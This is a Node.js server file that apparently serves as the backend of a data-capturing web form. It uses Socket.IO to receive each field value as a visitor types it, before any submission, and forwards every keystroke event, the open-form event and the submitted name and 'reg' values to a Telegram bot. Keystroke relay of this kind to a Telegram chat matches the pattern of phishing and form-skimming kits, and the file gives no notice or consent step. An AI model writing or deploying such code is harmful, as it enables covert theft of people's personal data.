const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const axios = require("axios");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" }
});

app.use(cors());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

function sendTelegram(message){
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: message
    }).catch(err => console.error("Telegram error:", err.message));
}

io.on("connection", (socket) => {
    console.log("User opened the form");
    sendTelegram("⚠️ Someone opened your form");

    socket.on("typing", (data) => {
        console.log("Typing:", data);
        sendTelegram(`Typing\nField: ${data.field}\nValue: ${data.value}`);
    });

    socket.on("submit", (data) => {
        console.log("Form submitted", data);
        sendTelegram(`✅ Form submitted\nName: ${data.name}\nReg: ${data.reg}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
